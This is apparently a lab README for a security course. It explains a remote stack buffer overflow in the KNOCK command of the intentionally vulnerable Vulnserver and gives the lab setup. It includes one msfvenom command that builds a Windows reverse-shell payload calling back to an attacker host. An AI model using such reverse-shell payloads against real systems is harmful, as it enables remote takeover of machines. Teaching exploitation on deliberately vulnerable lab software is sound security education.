# Remote eploit of Vulnserver

The test procedures and results are the same as what in the original [Blog](https://fluidattacks.com/blog/vulnserver-trun/). in this post, we are using the revised [vulnserver](https://github.com/xinwenfu/Malware-Analysis/tree/main/vulnserver).

**Overview**

This is a classical example of remote exploit of a buffer overflow vulnerability. 

In the function *DWORD WINAPI ConnectionHandler(LPVOID CSocket)* of vulnserver.c, the message sent from the user (e.g. attacker) is put into a local buffer *RecvBuf*. The following code snippet copies 3000 bytes of *RecvBuf* into another buffer *KnocBuf*. *KnocBuf* is then passed to *Function3(KnocBuf)*.
```
        strncpy(KnocBuf, RecvBuf, 3000);				
	Function3(KnocBuf);
```
In Function3(.), strcpy(.) is used to copy the passed data pointed to by *Input* (i.e. *KnocBuf*) into a local buffer *Buffer2S[2000]*. Apparently *KnocBuf* may contain 3000 bytes of user (attacker) input and may overflow *Buffer2S*. Bufferflow may then occur.
```
void Function3(char *Input) {
	char Buffer2S[2000];	
	strcpy(Buffer2S, Input);
}
```

It can be observerd that the remote exploit of a buffer overflow vulnarability is really similar to a local exploit. The difference is the data/message overflowing a buffer of a servr comes from a remote user/attack to the server.

exploit4.py exploits the command KNOCK of vulnserver.

**Experiment setup**
1. Windows 10 with all Exploit Protection disabled
2. [mingw-w64](http://mingw-w64.org/doku.php) installed
3. [nasm](https://www.nasm.us/) installed
4. [arwin](https://github.com/xinwenfu/arwin) installed
5. [Windows Sysinternals/listdlls](https://docs.microsoft.com/en-us/sysinternals/) installed
6. Local host: 10.0.2.8
7. Victim host: 10.0.2.7

## Notes
1. If the test setting above is used, the python attacking code works directly with no need of change.
2. If the address of *jmp esp* comes from essfunc.dll as used in the example Python code, essfunc.dll does not use ASLR and there is no need of changing the address of *jmp esp* when Windows 10 reboots.
3. If the ip of the local host (attacker's computer) is 10.0.2.8, no need of generating the shellcode using the following command
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
```
